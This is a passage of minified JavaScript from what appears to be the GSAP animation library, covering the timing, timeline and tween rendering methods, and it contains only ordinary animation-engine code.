              return arguments.length
                ? this.totalTime(this._time + (t - 1) * r, e)
                : this._repeat
                ? It(this._tTime, r) + 1
                : 1;
            }),
            (e.timeScale = function (t) {
              if (!arguments.length) return -1e-8 === this._rts ? 0 : this._rts;
              if (this._rts === t) return this;
              var e =
                this.parent && this._ts
                  ? jt(this.parent._time, this)
                  : this._tTime;
              return (
                (this._rts = +t || 0),
                (this._ts = this._ps || -1e-8 === t ? 0 : this._rts),
                (function (t) {
                  for (var e = t.parent; e && e.parent; )
                    (e._dirty = 1), e.totalDuration(), (e = e.parent);
                  return t;
                })(this.totalTime(Zt(-this._delay, this._tDur, e), !0))
              );
            }),
            (e.paused = function (t) {
              return arguments.length
                ? (this._ps !== t &&
                    ((this._ps = t),
                    t
                      ? ((this._pTime =
                          this._tTime ||
                          Math.max(-this._delay, this.rawTime())),
                        (this._ts = this._act = 0))
                      : (Te(),
                        (this._ts = this._rts),
                        this.totalTime(
                          this.parent && !this.parent.smoothChildTiming
                            ? this.rawTime()
                            : this._tTime || this._pTime,
                          1 === this.progress() &&
                            (this._tTime -= 1e-8) &&
                            1e-8 !== Math.abs(this._zTime)
                        ))),
                  this)
                : this._ps;
            }),
            (e.startTime = function (t) {
              if (arguments.length) {
                this._start = t;
                var e = this.parent || this._dp;
                return (
                  e &&
                    (e._sort || !this.parent) &&
                    Wt(e, this, t - this._delay),
                  this
                );
              }
              return this._start;
            }),
            (e.endTime = function (t) {
              return (
                this._start +
                (H(t) ? this.totalDuration() : this.duration()) /
                  Math.abs(this._ts)
              );
            }),
            (e.rawTime = function (t) {
              var e = this.parent || this._dp;
              return e
                ? t &&
                  (!this._ts ||
                    (this._repeat && this._time && this.totalProgress() < 1))
                  ? this._tTime % (this._dur + this._rDelay)
                  : this._ts
                  ? jt(e.rawTime(t), this)
                  : this._tTime
                : this._tTime;
            }),
            (e.globalTime = function (t) {
              for (var e = this, r = arguments.length ? t : e.rawTime(); e; )
                (r = e._start + r / (e._ts || 1)), (e = e._dp);
              return r;
            }),
            (e.repeat = function (t) {
              return arguments.length
                ? ((this._repeat = t), Yt(this))
                : this._repeat;
            }),
            (e.repeatDelay = function (t) {
              return arguments.length
                ? ((this._rDelay = t), Yt(this))
                : this._rDelay;
            }),
            (e.yoyo = function (t) {
              return arguments.length ? ((this._yoyo = t), this) : this._yoyo;
            }),
            (e.seek = function (t, e) {
              return this.totalTime(Kt(this, t), H(e));
            }),
            (e.restart = function (t, e) {
              return this.play().totalTime(t ? -this._delay : 0, H(e));
            }),
            (e.play = function (t, e) {
              return null != t && this.seek(t, e), this.reversed(!1).paused(!1);
            }),
            (e.reverse = function (t, e) {
              return (
                null != t && this.seek(t || this.totalDuration(), e),
                this.reversed(!0).paused(!1)
              );
            }),
            (e.pause = function (t, e) {
              return null != t && this.seek(t, e), this.paused(!0);
            }),
            (e.resume = function () {
              return this.paused(!1);
            }),
            (e.reversed = function (t) {
              return arguments.length
                ? (!!t !== this.reversed() &&
                    this.timeScale(-this._rts || (t ? -1e-8 : 0)),
                  this)
                : this._rts < 0;
            }),
            (e.invalidate = function () {
              return (this._initted = 0), (this._zTime = -1e-8), this;
            }),
            (e.isActive = function () {
              var t,
                e = this.parent || this._dp,
                r = this._start;
              return !(
                e &&
                !(
                  this._ts &&
                  this._initted &&
                  e.isActive() &&
                  (t = e.rawTime(!0)) >= r &&
                  t < this.endTime(!0) - 1e-8
                )
              );
            }),
            (e.eventCallback = function (t, e, r) {
              var i = this.vars;
              return arguments.length > 1
                ? (e
                    ? ((i[t] = e),
                      r && (i[t + "Params"] = r),
                      "onUpdate" === t && (this._onUpdate = e))
                    : delete i[t],
                  this)
                : i[t];
            }),
            (e.then = function (t) {
              var e = this;
              return new Promise(function (r) {
                var i = V(t) ? t : Et,
                  n = function () {
                    var t = e.then;
                    (e.then = null),
                      V(i) && (i = i(e)) && (i.then || i === e) && (e.then = t),
                      r(i),
                      (e.then = t);
                  };
                (e._initted && 1 === e.totalProgress() && e._ts >= 0) ||
                (!e._tTime && e._ts < 0)
                  ? n()
                  : (e._prom = n);
              });
            }),
            (e.kill = function () {
              pe(this);
            }),
            t
          );
        })();
      Ct(ze.prototype, {
        _time: 0,
        _start: 0,
        _end: 0,
        _tTime: 0,
        _tDur: 0,
        _dirty: 0,
        _repeat: 0,
        _yoyo: !1,
        parent: null,
        _initted: !1,
        _rDelay: 0,
        _ts: 1,
        _dp: 0,
        ratio: 0,
        _zTime: -1e-8,
        _prom: 0,
        _ps: !1,
        _rts: 1,
      });
      var Ie = (function (t) {
        function n(e, i) {
          var n;
          return (
            void 0 === e && (e = {}),
            ((n = t.call(this, e, i) || this).labels = {}),
            (n.smoothChildTiming = !!e.smoothChildTiming),
            (n.autoRemoveChildren = !!e.autoRemoveChildren),
            (n._sort = H(e.sortChildren)),
            n.parent && Ut(n.parent, r(n)),
            e.scrollTrigger && Ht(r(n), e.scrollTrigger),
            n
          );
        }
        e(n, t);
        var s = n.prototype;
        return (
          (s.to = function (t, e, r) {
            return (
              new Ye(
                t,
                bt(arguments, 0, this),
                Kt(this, N(e) ? arguments[3] : r)
              ),
              this
            );
          }),
          (s.from = function (t, e, r) {
            return (
              new Ye(
                t,
                bt(arguments, 1, this),
                Kt(this, N(e) ? arguments[3] : r)
              ),
              this
            );
          }),
          (s.fromTo = function (t, e, r, i) {
            return (
              new Ye(
                t,
                bt(arguments, 2, this),
                Kt(this, N(e) ? arguments[4] : i)
              ),
              this
            );
          }),
          (s.set = function (t, e, r) {
            return (
              (e.duration = 0),
              (e.parent = this),
              At(e).repeatDelay || (e.repeat = 0),
              (e.immediateRender = !!e.immediateRender),
              new Ye(t, e, Kt(this, r), 1),
              this
            );
          }),
          (s.call = function (t, e, r) {
            return Wt(this, Ye.delayedCall(0, t, e), Kt(this, r));
          }),
          (s.staggerTo = function (t, e, r, i, n, s, o) {
            return (
              (r.duration = e),
              (r.stagger = r.stagger || i),
              (r.onComplete = s),
              (r.onCompleteParams = o),
              (r.parent = this),
              new Ye(t, r, Kt(this, n)),
              this
            );
          }),
          (s.staggerFrom = function (t, e, r, i, n, s, o) {
            return (
              (r.runBackwards = 1),
              (At(r).immediateRender = H(r.immediateRender)),
              this.staggerTo(t, e, r, i, n, s, o)
            );
          }),
          (s.staggerFromTo = function (t, e, r, i, n, s, o, a) {
            return (
              (i.startAt = r),
              (At(i).immediateRender = H(i.immediateRender)),
              this.staggerTo(t, e, i, n, s, o, a)
            );
          }),
          (s.render = function (t, e, r) {
            var n,
              s,
              o,
              a,
              l,
              h,
              u,
              c,
              d,
              p,
              f,
              g,
              m = this._time,
              _ = this._dirty ? this.totalDuration() : this._tDur,
              v = this._dur,
              y = this !== i && t > _ - 1e-8 && t >= 0 ? _ : t < 1e-8 ? 0 : t,
              D = this._zTime < 0 != t < 0 && (this._initted || !v);
            if (y !== this._tTime || r || D) {
              if (
                (m !== this._time &&
                  v &&
                  ((y += this._time - m), (t += this._time - m)),
                (n = y),
                (d = this._start),
                (h = !(c = this._ts)),
                D && (v || (m = this._zTime), (t || !e) && (this._zTime = t)),
                this._repeat &&
                  ((f = this._yoyo),
                  (l = v + this._rDelay),
                  (n = Dt(y % l)),
                  y === _
                    ? ((a = this._repeat), (n = v))
                    : ((a = ~~(y / l)) && a === y / l && ((n = v), a--),
                      n > v && (n = v)),
                  (p = It(this._tTime, l)),
                  !m && this._tTime && p !== a && (p = a),
                  f && 1 & a && ((n = v - n), (g = 1)),
                  a !== p && !this._lock))
              ) {
                var x = f && 1 & p,
                  b = x === (f && 1 & a);
                if (
                  (a < p && (x = !x),
                  (m = x ? 0 : v),
                  (this._lock = 1),
                  (this.render(m || (g ? 0 : Dt(a * l)), e, !v)._lock = 0),
                  !e && this.parent && de(this, "onRepeat"),
                  this.vars.repeatRefresh &&
                    !g &&
                    (this.invalidate()._lock = 1),
                  m !== this._time || h !== !this._ts)
                )
                  return this;
                if (
                  ((v = this._dur),
                  (_ = this._tDur),
                  b &&
                    ((this._lock = 2),
                    (m = x ? v : -1e-4),
                    this.render(m, !0),
                    this.vars.repeatRefresh && !g && this.invalidate()),
                  (this._lock = 0),
                  !this._ts && !h)
                )
                  return this;
                Me(this, g);
              }
              if (
                (this._hasPause &&
                  !this._forcing &&
                  this._lock < 2 &&
                  (u = (function (t, e, r) {
                    var i;
                    if (r > e)
                      for (i = t._first; i && i._start <= r; ) {
                        if (!i._dur && "isPause" === i.data && i._start > e)
                          return i;
                        i = i._next;
                      }
                    else
                      for (i = t._last; i && i._start >= r; ) {
                        if (!i._dur && "isPause" === i.data && i._start < e)
                          return i;
                        i = i._prev;
                      }
                  })(this, Dt(m), Dt(n))) &&
                  (y -= n - (n = u._start)),
                (this._tTime = y),
                (this._time = n),
                (this._act = !c),
                this._initted ||
                  ((this._onUpdate = this.vars.onUpdate),
                  (this._initted = 1),
                  (this._zTime = t)),
                !m && n && !e && de(this, "onStart"),
                n >= m && t >= 0)
              )
                for (s = this._first; s; ) {
                  if (
                    ((o = s._next),
                    (s._act || n >= s._start) && s._ts && u !== s)
                  ) {
                    if (s.parent !== this) return this.render(t, e, r);
                    if (
                      (s.render(
                        s._ts > 0
                          ? (n - s._start) * s._ts
                          : (s._dirty ? s.totalDuration() : s._tDur) +
                              (n - s._start) * s._ts,
                        e,
                        r
                      ),
                      n !== this._time || (!this._ts && !h))
                    ) {
                      (u = 0), o && (y += this._zTime = -1e-8);
                      break;
                    }
                  }
                  s = o;
                }
              else {
                s = this._last;
                for (var w = t < 0 ? t : n; s; ) {
                  if (
                    ((o = s._prev), (s._act || w <= s._end) && s._ts && u !== s)
                  ) {
                    if (s.parent !== this) return this.render(t, e, r);
                    if (
                      (s.render(
                        s._ts > 0
                          ? (w - s._start) * s._ts
                          : (s._dirty ? s.totalDuration() : s._tDur) +
                              (w - s._start) * s._ts,
                        e,
                        r
                      ),
                      n !== this._time || (!this._ts && !h))
                    ) {
                      (u = 0), o && (y += this._zTime = w ? -1e-8 : 1e-8);
                      break;
                    }
                  }
                  s = o;
                }
              }
              if (
                u &&
                !e &&
                (this.pause(),
                (u.render(n >= m ? 0 : -1e-8)._zTime = n >= m ? 1 : -1),
                this._ts)
              )
                return (this._start = d), Vt(this), this.render(t, e, r);
              this._onUpdate && !e && de(this, "onUpdate", !0),
                ((y === _ && _ >= this.totalDuration()) || (!y && m)) &&
                  ((d !== this._start && Math.abs(c) === Math.abs(this._ts)) ||
                    this._lock ||
                    ((t || !v) &&
                      ((y === _ && this._ts > 0) || (!y && this._ts < 0)) &&
                      kt(this, 1),
                    e ||
                      (t < 0 && !m) ||
                      (!y && !m) ||
                      (de(
                        this,
                        y === _ ? "onComplete" : "onReverseComplete",
                        !0
                      ),
                      this._prom &&
                        !(y < _ && this.timeScale() > 0) &&
                        this._prom())));
            }
            return this;
          }),
          (s.add = function (t, e) {
            var r = this;
            if ((N(e) || (e = Kt(this, e)), !(t instanceof ze))) {
              if (G(t))
                return (
                  t.forEach(function (t) {
                    return r.add(t, e);
                  }),
                  this
                );
              if (j(t)) return this.addLabel(t, e);
              if (!V(t)) return this;
              t = Ye.delayedCall(0, t);
            }
            return this !== t ? Wt(this, t, e) : this;
          }),
          (s.getChildren = function (t, e, r, i) {
            void 0 === t && (t = !0),
              void 0 === e && (e = !0),
              void 0 === r && (r = !0),
              void 0 === i && (i = -A);
            for (var n = [], s = this._first; s; )
              s._start >= i &&
                (s instanceof Ye
                  ? e && n.push(s)
                  : (r && n.push(s),
                    t && n.push.apply(n, s.getChildren(!0, e, r)))),
                (s = s._next);
            return n;
          }),
          (s.getById = function (t) {
            for (var e = this.getChildren(1, 1, 1), r = e.length; r--; )
              if (e[r].vars.id === t) return e[r];
          }),
          (s.remove = function (t) {
            return j(t)
              ? this.removeLabel(t)
              : V(t)
              ? this.killTweensOf(t)
              : (Ot(this, t),
                t === this._recent && (this._recent = this._last),
                Lt(this));
          }),
          (s.totalTime = function (e, r) {
            return arguments.length
              ? ((this._forcing = 1),
                !this._dp &&
                  this._ts &&
                  (this._start = Dt(
                    we.time -
                      (this._ts > 0
                        ? e / this._ts
                        : (this.totalDuration() - e) / -this._ts)
                  )),
                t.prototype.totalTime.call(this, e, r),
                (this._forcing = 0),
                this)
              : this._tTime;
          }),
          (s.addLabel = function (t, e) {
            return (this.labels[t] = Kt(this, e)), this;
          }),
          (s.removeLabel = function (t) {
            return delete this.labels[t], this;
          }),
          (s.addPause = function (t, e, r) {
            var i = Ye.delayedCall(0, e || at, r);
            return (
              (i.data = "isPause"),
              (this._hasPause = 1),
              Wt(this, i, Kt(this, t))
            );
          }),
          (s.removePause = function (t) {
            var e = this._first;
            for (t = Kt(this, t); e; )
              e._start === t && "isPause" === e.data && kt(e), (e = e._next);
          }),
          (s.killTweensOf = function (t, e, r) {
            for (var i = this.getTweensOf(t, r), n = i.length; n--; )
              je !== i[n] && i[n].kill(t, e);
            return this;
          }),
          (s.getTweensOf = function (t, e) {
            for (var r, i = [], n = re(t), s = this._first, o = N(e); s; )
              s instanceof Ye
                ? xt(s._targets, n) &&
                  (o
                    ? (!je || (s._initted && s._ts)) &&
                      s.globalTime(0) <= e &&
                      s.globalTime(s.totalDuration()) > e
                    : !e || s.isActive()) &&
                  i.push(s)
                : (r = s.getTweensOf(n, e)).length && i.push.apply(i, r),
                (s = s._next);
            return i;
          }),
          (s.tweenTo = function (t, e) {
            e = e || {};
            var r = this,
              i = Kt(r, t),
              n = e,
              s = n.startAt,
              o = n.onStart,
              a = n.onStartParams,
              l = Ye.to(
                r,
                Ct(e, {
                  ease: "none",
                  lazy: !1,
                  time: i,
                  overwrite: "auto",
                  duration:
                    e.duration ||
                    Math.abs(
                      (i - (s && "time" in s ? s.time : r._time)) /
                        r.timeScale()
                    ) ||
                    1e-8,
                  onStart: function () {
                    r.pause();
                    var t =
                      e.duration || Math.abs((i - r._time) / r.timeScale());
                    l._dur !== t && Xt(l, t, 0, 1).render(l._time, !0, !0),
                      o && o.apply(l, a || []);
                  },
                })
              );
            return l;
          }),
          (s.tweenFromTo = function (t, e, r) {
            return this.tweenTo(e, Ct({ startAt: { time: Kt(this, t) } }, r));
          }),
          (s.recent = function () {
            return this._recent;
          }),
          (s.nextLabel = function (t) {
            return void 0 === t && (t = this._time), ce(this, Kt(this, t));
          }),
          (s.previousLabel = function (t) {
            return void 0 === t && (t = this._time), ce(this, Kt(this, t), 1);
          }),
          (s.currentLabel = function (t) {
            return arguments.length
              ? this.seek(t, !0)
              : this.previousLabel(this._time + 1e-8);
          }),
          (s.shiftChildren = function (t, e, r) {
            void 0 === r && (r = 0);
            for (var i, n = this._first, s = this.labels; n; )
              n._start >= r && ((n._start += t), (n._end += t)), (n = n._next);
            if (e) for (i in s) s[i] >= r && (s[i] += t);
            return Lt(this);
          }),
          (s.invalidate = function () {
            var e = this._first;
            for (this._lock = 0; e; ) e.invalidate(), (e = e._next);
            return t.prototype.invalidate.call(this);
          }),
          (s.clear = function (t) {
            void 0 === t && (t = !0);
            for (var e, r = this._first; r; )
              (e = r._next), this.remove(r), (r = e);
            return (
              (this._time = this._tTime = this._pTime = 0),
              t && (this.labels = {}),
              Lt(this)
            );
          }),
          (s.totalDuration = function (t) {
            var e,
              r,
              n,
              s = 0,
              o = this,
              a = o._last,
              l = A;
            if (arguments.length)
              return o.timeScale(
                (o._repeat < 0 ? o.duration() : o.totalDuration()) /
                  (o.reversed() ? -t : t)
              );
            if (o._dirty) {
              for (n = o.parent; a; )
                (e = a._prev),
                  a._dirty && a.totalDuration(),
                  (r = a._start) > l && o._sort && a._ts && !o._lock
                    ? ((o._lock = 1), (Wt(o, a, r - a._delay, 1)._lock = 0))
                    : (l = r),
                  r < 0 &&
                    a._ts &&
                    ((s -= r),
                    ((!n && !o._dp) || (n && n.smoothChildTiming)) &&
                      ((o._start += r / o._ts),
                      (o._time -= r),
                      (o._tTime -= r)),
                    o.shiftChildren(-r, !1, -1 / 0),
                    (l = 0)),
                  a._end > s && a._ts && (s = a._end),
                  (a = e);
              Xt(o, o === i && o._time > s ? o._time : s, 1, 1), (o._dirty = 0);
            }
            return o._tDur;
          }),
          (n.updateRoot = function (t) {
            if ((i._ts && (Tt(i, jt(t, i)), (l = we.frame)), we.frame >= pt)) {
              pt += M.autoSleep || 120;
              var e = i._first;
              if ((!e || !e._ts) && M.autoSleep && we._listeners.length < 2) {
                for (; e && !e._ts; ) e = e._next;
                e || we.sleep();
              }
            }
          }),
          n
        );
      })(ze);
      Ct(Ie.prototype, { _lock: 0, _hasPause: 0, _forcing: 0 });
      var je,
        Ve = function (t, e, r, i, n, s, o) {
          var a,
            l,
            h,
            u,
            c,
            d,
            p,
            f,
            g = new ar(this._pt, t, e, 0, 1, er, null, n),
            m = 0,
            _ = 0;
          for (
            g.b = r,
              g.e = i,
              r += "",
              (p = ~(i += "").indexOf("random(")) && (i = he(i)),
              s && (s((f = [r, i]), t, e), (r = f[0]), (i = f[1])),
              l = r.match($) || [];
            (a = $.exec(i));

          )
            (u = a[0]),
              (c = i.substring(m, a.index)),
              h ? (h = (h + 1) % 5) : "rgba(" === c.substr(-5) && (h = 1),
              u !== l[_++] &&
                ((d = parseFloat(l[_ - 1]) || 0),
                (g._pt = {
                  _next: g._pt,
                  p: c || 1 === _ ? c : ",",
                  s: d,
                  c:
                    "=" === u.charAt(1)
                      ? parseFloat(u.substr(2)) * ("-" === u.charAt(0) ? -1 : 1)
                      : parseFloat(u) - d,
                  m: h && h < 4 ? Math.round : 0,
                }),
                (m = $.lastIndex));
          return (
            (g.c = m < i.length ? i.substring(m, i.length) : ""),
            (g.fp = o),
            (J.test(i) || p) && (g.e = 0),
            (this._pt = g),
            g
          );
        },
        Ne = function (t, e, r, i, n, s, o, a, l) {
          V(i) && (i = i(n || 0, t, s));
          var h,
            u = t[e],
            c =
              "get" !== r
                ? r
                : V(u)
                ? l
                  ? t[
                      e.indexOf("set") || !V(t["get" + e.substr(3)])
                        ? e
                        : "get" + e.substr(3)
                    ](l)
                  : t[e]()
                : u,
            d = V(u) ? (l ? Qe : Ke) : Ge;
          if (
            (j(i) &&
              (~i.indexOf("random(") && (i = he(i)),
              "=" === i.charAt(1) &&
                (i =
                  parseFloat(c) +
                  parseFloat(i.substr(2)) * ("-" === i.charAt(0) ? -1 : 1) +
                  ($t(c) || 0))),
            c !== i)
          )
            return isNaN(c * i)
              ? (!u && !(e in t) && nt(e, i),
                Ve.call(this, t, e, c, i, d, a || M.stringFilter, l))
              : ((h = new ar(
                  this._pt,
                  t,
                  e,
                  +c || 0,
                  i - (c || 0),
                  "boolean" == typeof u ? tr : Je,
                  0,
                  d
                )),
                l && (h.fp = l),
                o && h.modifier(o, this, t),
                (this._pt = h));
        },
        Ue = function (t, e, r, i, n, s) {
          var o, a, l, u;
          if (
            ct[t] &&
            !1 !==
              (o = new ct[t]()).init(
                n,
                o.rawVars
                  ? e[t]
                  : (function (t, e, r, i, n) {
                      if (
                        (V(t) && (t = He(t, n, e, r, i)),
                        !W(t) || (t.style && t.nodeType) || G(t) || Y(t))
                      )
                        return j(t) ? He(t, n, e, r, i) : t;
                      var s,
                        o = {};
                      for (s in t) o[s] = He(t[s], n, e, r, i);
                      return o;
                    })(e[t], i, n, s, r),
                r,
                i,
                s
              ) &&
            ((r._pt = a =
              new ar(r._pt, n, t, 0, 1, o.render, o, 0, o.priority)),
            r !== h)
          )
            for (
              l = r._ptLookup[r._targets.indexOf(n)], u = o._props.length;
              u--;

            )
              l[o._props[u]] = a;
          return o;
        },
        We = function t(e, r) {
          var n,
            s,
            o,
            a,
            l,
            h,
            u,
            c,
            d,
            p,
            f,
            g,
            m,
            _ = e.vars,
            v = _.ease,
            y = _.startAt,
            D = _.immediateRender,
            x = _.lazy,
            b = _.onUpdate,
            w = _.onUpdateParams,
            T = _.callbackScope,
            S = _.runBackwards,
            E = _.yoyoEase,
            C = _.keyframes,
            P = _.autoRevert,
            F = e._dur,
            M = e._startAt,
            A = e._targets,
            O = e.parent,
            k = O && "nested" === O.data ? O.parent._targets : A,
            L = "auto" === e._overwrite,
            B = e.timeline;
          if (
            (B && (!C || !v) && (v = "none"),
            (e._ease = Re(v, R.ease)),
            (e._yEase = E ? Fe(Re(!0 === E ? v : E, R.ease)) : 0),
            E &&
              e._yoyo &&
              !e._repeat &&
              ((E = e._yEase), (e._yEase = e._ease), (e._ease = E)),
            !B)
          ) {
            if (
              ((g = (c = A[0] ? _t(A[0]).harness : 0) && _[c.prop]),
              (n = Rt(_, lt)),
              M && M.render(-1, !0).kill(),
              y)
            ) {
              if (
                (kt(
                  (e._startAt = Ye.set(
                    A,
                    Ct(
                      {
                        data: "isStart",
                        overwrite: !1,
                        parent: O,
                        immediateRender: !0,
                        lazy: H(x),
                        startAt: null,
                        delay: 0,
                        onUpdate: b,
                        onUpdateParams: w,
                        callbackScope: T,
                        stagger: 0,
                      },
                      y
                    )
                  ))
                ),
                D)
              )
                if (r > 0) P || (e._startAt = 0);
                else if (F && !(r < 0 && M)) return void (r && (e._zTime = r));
            } else if (S && F)
              if (M) !P && (e._startAt = 0);
              else if (
                (r && (D = !1),
                (o = Ct(
                  {
                    overwrite: !1,
                    data: "isFromStart",
                    lazy: D && H(x),
                    immediateRender: D,
                    stagger: 0,
                    parent: O,
                  },
                  n
                )),
                g && (o[c.prop] = g),
                kt((e._startAt = Ye.set(A, o))),
                D)
              ) {
                if (!r) return;
              } else t(e._startAt, 1e-8);
            for (
              e._pt = 0, x = (F && H(x)) || (x && !F), s = 0;
              s < A.length;
              s++
            ) {
              if (
                ((u = (l = A[s])._gsap || mt(A)[s]._gsap),
                (e._ptLookup[s] = p = {}),
                ut[u.id] && ht.length && wt(),
                (f = k === A ? s : k.indexOf(l)),
                c &&
                  !1 !== (d = new c()).init(l, g || n, e, f, k) &&
                  ((e._pt = a =
                    new ar(e._pt, l, d.name, 0, 1, d.render, d, 0, d.priority)),
                  d._props.forEach(function (t) {
                    p[t] = a;
                  }),
                  d.priority && (h = 1)),
                !c || g)
              )
                for (o in n)
                  ct[o] && (d = Ue(o, n, e, f, l, k))
                    ? d.priority && (h = 1)
                    : (p[o] = a =
                        Ne.call(e, l, o, "get", n[o], f, k, 0, _.stringFilter));
              e._op && e._op[s] && e.kill(l, e._op[s]),
                L &&
                  e._pt &&
                  ((je = e),
                  i.killTweensOf(l, p, e.globalTime(0)),
                  (m = !e.parent),
                  (je = 0)),
                e._pt && x && (ut[u.id] = 1);
            }
            h && or(e), e._onInit && e._onInit(e);
          }
          (e._from = !B && !!_.runBackwards),
            (e._onUpdate = b),
            (e._initted = (!e._op || e._pt) && !m);
        },
        He = function (t, e, r, i, n) {
          return V(t)
            ? t.call(e, r, i, n)
            : j(t) && ~t.indexOf("random(")
            ? he(t)
            : t;
        },
        qe = gt + "repeat,repeatDelay,yoyo,repeatRefresh,yoyoEase",
        Xe = (qe + ",id,stagger,delay,duration,paused,scrollTrigger").split(
          ","
        ),
        Ye = (function (t) {
          function n(e, n, s, o) {
            var a;
            "number" == typeof n && ((s.duration = n), (n = s), (s = null));
            var l,
              h,
              u,
              c,
              d,
              p,
              f,
              g,
              m = (a = t.call(this, o ? n : At(n), s) || this).vars,
              _ = m.duration,
              v = m.delay,
              y = m.immediateRender,
              D = m.stagger,
              x = m.overwrite,
              b = m.keyframes,
              w = m.defaults,
              T = m.scrollTrigger,
              S = m.yoyoEase,
              E = a.parent,
              C = (G(e) || Y(e) ? N(e[0]) : "length" in n) ? [e] : re(e);
            if (
              ((a._targets = C.length
                ? mt(C)
                : st(
                    "GSAP target " + e + " not found. https://greensock.com",
                    !M.nullTargetWarn
                  ) || []),
              (a._ptLookup = []),
              (a._overwrite = x),
              b || D || X(_) || X(v))
            ) {
              if (
                ((n = a.vars),
                (l = a.timeline =
                  new Ie({ data: "nested", defaults: w || {} })).kill(),
                (l.parent = r(a)),
                b)
              )
                Ct(l.vars.defaults, { ease: "none" }),
                  b.forEach(function (t) {
                    return l.to(C, t, ">");
                  });
              else {
                if (((c = C.length), (f = D ? ne(D) : at), W(D)))
                  for (d in D) ~qe.indexOf(d) && (g || (g = {}), (g[d] = D[d]));
                for (h = 0; h < c; h++) {
                  for (d in ((u = {}), n)) Xe.indexOf(d) < 0 && (u[d] = n[d]);
                  (u.stagger = 0),
                    S && (u.yoyoEase = S),
                    g && Ft(u, g),
                    (p = C[h]),
                    (u.duration = +He(_, r(a), h, p, C)),
                    (u.delay = (+He(v, r(a), h, p, C) || 0) - a._delay),
                    !D &&
                      1 === c &&
                      u.delay &&
                      ((a._delay = v = u.delay),
                      (a._start += v),
                      (u.delay = 0)),
                    l.to(p, u, f(h, p, C));
                }
                l.duration() ? (_ = v = 0) : (a.timeline = 0);
              }
              _ || a.duration((_ = l.duration()));
            } else a.timeline = 0;
            return (
              !0 === x && ((je = r(a)), i.killTweensOf(C), (je = 0)),
              E && Ut(E, r(a)),
              (y ||
                (!_ &&
                  !b &&
                  a._start === Dt(E._time) &&
                  H(y) &&
                  (function t(e) {
                    return !e || (e._ts && t(e.parent));
                  })(r(a)) &&
                  "nested" !== E.data)) &&
                ((a._tTime = -1e-8), a.render(Math.max(0, -v))),
              T && Ht(r(a), T),
              a
            );
          }
          e(n, t);
          var s = n.prototype;
          return (
            (s.render = function (t, e, r) {
              var i,
                n,
                s,
                o,
                a,
                l,
                h,
                u,
                c,
                d = this._time,
                p = this._tDur,
                f = this._dur,
                g = t > p - 1e-8 && t >= 0 ? p : t < 1e-8 ? 0 : t;
              if (f) {
                if (
                  g !== this._tTime ||
                  !t ||
                  r ||
                  (this._startAt && this._zTime < 0 != t < 0)
                ) {
                  if (((i = g), (u = this.timeline), this._repeat)) {
                    if (
                      ((o = f + this._rDelay),
                      (i = Dt(g % o)),
                      g === p
                        ? ((s = this._repeat), (i = f))
                        : ((s = ~~(g / o)) && s === g / o && ((i = f), s--),
                          i > f && (i = f)),
                      (l = this._yoyo && 1 & s) &&
                        ((c = this._yEase), (i = f - i)),
                      (a = It(this._tTime, o)),
                      i === d && !r && this._initted)
                    )
                      return this;
                    s !== a &&
                      (u && this._yEase && Me(u, l),
                      !this.vars.repeatRefresh ||
                        l ||
                        this._lock ||
                        ((this._lock = r = 1),
                        (this.render(Dt(o * s), !0).invalidate()._lock = 0)));
                  }
                  if (!this._initted) {
                    if (qt(this, t < 0 ? t : i, r, e))
                      return (this._tTime = 0), this;
                    if (f !== this._dur) return this.render(t, e, r);
                  }
                  for (
                    this._tTime = g,
                      this._time = i,
                      !this._act &&
                        this._ts &&
                        ((this._act = 1), (this._lazy = 0)),
                      this.ratio = h = (c || this._ease)(i / f),
                      this._from && (this.ratio = h = 1 - h),
                      i && !d && !e && de(this, "onStart"),
                      n = this._pt;
                    n;

                  )
                    n.r(h, n.d), (n = n._next);
                  (u &&
                    u.render(t < 0 ? t : !i && l ? -1e-8 : u._dur * h, e, r)) ||
                    (this._startAt && (this._zTime = t)),
                    this._onUpdate &&
                      !e &&
                      (t < 0 && this._startAt && this._startAt.render(t, !0, r),
                      de(this, "onUpdate")),
                    this._repeat &&
                      s !== a &&
                      this.vars.onRepeat &&
                      !e &&
                      this.parent &&
                      de(this, "onRepeat"),
                    (g !== this._tDur && g) ||
                      this._tTime !== g ||
                      (t < 0 &&
                        this._startAt &&
                        !this._onUpdate &&
                        this._startAt.render(t, !0, !0),
                      (t || !f) &&
                        ((g === this._tDur && this._ts > 0) ||
                          (!g && this._ts < 0)) &&
                        kt(this, 1),
                      e ||
                        (t < 0 && !d) ||
                        (!g && !d) ||
                        (de(
                          this,
                          g === p ? "onComplete" : "onReverseComplete",
                          !0
                        ),
                        this._prom &&
                          !(g < p && this.timeScale() > 0) &&
                          this._prom()));
                }
              } else
                !(function (t, e, r, i) {
                  var n,
                    s,
                    o = t.ratio,
                    a =
                      e < 0 ||
                      (!e &&
                        o &&
                        !t._start &&
                        t._zTime > 1e-8 &&
                        !t._dp._lock) ||
                      ((t._ts < 0 || t._dp._ts < 0) &&
                        "isFromStart" !== t.data &&
                        "isStart" !== t.data)
                        ? 0
                        : 1,
                    l = t._rDelay,
                    h = 0;
                  if (
                    (l &&
                      t._repeat &&
                      ((h = Zt(0, t._tDur, e)),
                      It(h, l) !== (s = It(t._tTime, l)) &&
                        ((o = 1 - a),
                        t.vars.repeatRefresh && t._initted && t.invalidate())),
                    a !== o || i || 1e-8 === t._zTime || (!e && t._zTime))
                  ) {
                    if (!t._initted && qt(t, e, i, r)) return;
                    for (
                      s = t._zTime,
                        t._zTime = e || (r ? 1e-8 : 0),
                        r || (r = e && !s),
                        t.ratio = a,
                        t._from && (a = 1 - a),
                        t._time = 0,
                        t._tTime = h,
                        r || de(t, "onStart"),
                        n = t._pt;
                      n;

                    )
                      n.r(a, n.d), (n = n._next);
                    t._startAt && e < 0 && t._startAt.render(e, !0, !0),
                      t._onUpdate && !r && de(t, "onUpdate"),
                      h && t._repeat && !r && t.parent && de(t, "onRepeat"),
                      (e >= t._tDur || e < 0) &&
                        t.ratio === a &&
                        (a && kt(t, 1),
                        r ||
                          (de(t, a ? "onComplete" : "onReverseComplete", !0),
                          t._prom && t._prom()));
                  } else t._zTime || (t._zTime = e);
                })(this, t, e, r);
              return this;
            }),
            (s.targets = function () {
              return this._targets;
            }),
            (s.invalidate = function () {
              return (
                (this._pt =
                  this._op =
                  this._startAt =
                  this._onUpdate =
                  this._act =
                  this._lazy =
                    0),
                (this._ptLookup = []),
                this.timeline && this.timeline.invalidate(),
                t.prototype.invalidate.call(this)
              );
            }),
            (s.kill = function (t, e) {
              if (
                (void 0 === e && (e = "all"),
                !(t || (e && "all" !== e)) && ((this._lazy = 0), this.parent))
              )
                return pe(this);
              if (this.timeline) {
